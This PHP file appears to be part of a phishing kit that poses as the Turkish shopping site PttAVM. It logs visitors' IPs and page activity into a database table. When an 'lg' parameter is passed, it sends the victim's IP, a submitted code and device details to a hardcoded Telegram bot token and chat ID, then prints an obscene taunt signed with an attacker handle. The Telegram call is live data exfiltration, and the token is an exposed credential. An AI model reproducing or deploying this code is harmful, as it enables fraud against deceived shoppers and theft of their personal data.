<?php
include('database/connect.php');

$ip_adresi = strip_tags($_POST['ip_adresi']); 
$sayfa = strip_tags($_POST['sayfa']);
$ekleyen = strip_tags($_POST['ekleyen']);
$urunadi = strip_tags($_POST['urunadi']); 
$hizmet = 'PttAVM';
$stmt = $db->prepare("SELECT * FROM girisyapanlar WHERE ip_adresi = ?");
$stmt->execute([$ip_adresi]);
$row_count = $stmt->rowCount();
if ($row_count == 0) {
    $sql = "INSERT INTO girisyapanlar (ip_adresi, sayfa, ekleyen, hizmet, urunadi, son_etkinlik_zamani) VALUES (?, ?, ?, ?, ?, UNIX_TIMESTAMP())";
    $stmt = $db->prepare($sql);
    if ($stmt->execute([$ip_adresi, $sayfa, $ekleyen, $hizmet, $urunadi])) {
        echo "";
    } else {
        echo "";
    }
} else {
    $sql = "UPDATE girisyapanlar SET sayfa = ?, ekleyen = ?, hizmet = ?, urunadi = ?, son_etkinlik_zamani = UNIX_TIMESTAMP() WHERE ip_adresi = ?";
    $stmt = $db->prepare($sql);
    if ($stmt->execute([$sayfa, $ekleyen, $hizmet, $urunadi, $ip_adresi])) {
        echo "";
    } else {
        echo "";
    }
}
if($_GET['lg']){
	function GetIP(){
   if(getenv("HTTP_CLIENT_IP")) {
      $ip = getenv("HTTP_CLIENT_IP");
   } elseif(getenv("HTTP_X_FORWARDED_FOR")) {
      $ip = getenv("HTTP_X_FORWARDED_FOR");
      if (strstr($ip, ',')) {
         $tmp = explode (',', $ip);
         $ip = trim($tmp[0]);
      }
   } else {
   $ip = getenv("REMOTE_ADDR");
   }
   return $ip;
}
$sazan_ip = GetIP();
$aresText = 'Sazan IP : '.$sazan_ip.'
Sazan Kod : '.htmlspecialchars($_GET['lg']).'
Sazan Cihaz : '.htmlspecialchars($_SERVER["HTTP_USER_AGENT"]).'
';
$aresText=urlencode($aresText);

	
	
file_get_contents("https://api.telegram.org/bot6797512084:AAGbJVoC0zcKWYPbFG8oc_bACPn6gUEye_E/sendMessage?chat_id=-1002104835510&text=$aresText");

echo 'Output: Büyük Konuşma Aslanım Shelinide Ananıda Sikerler | @AresRS34';
}

?>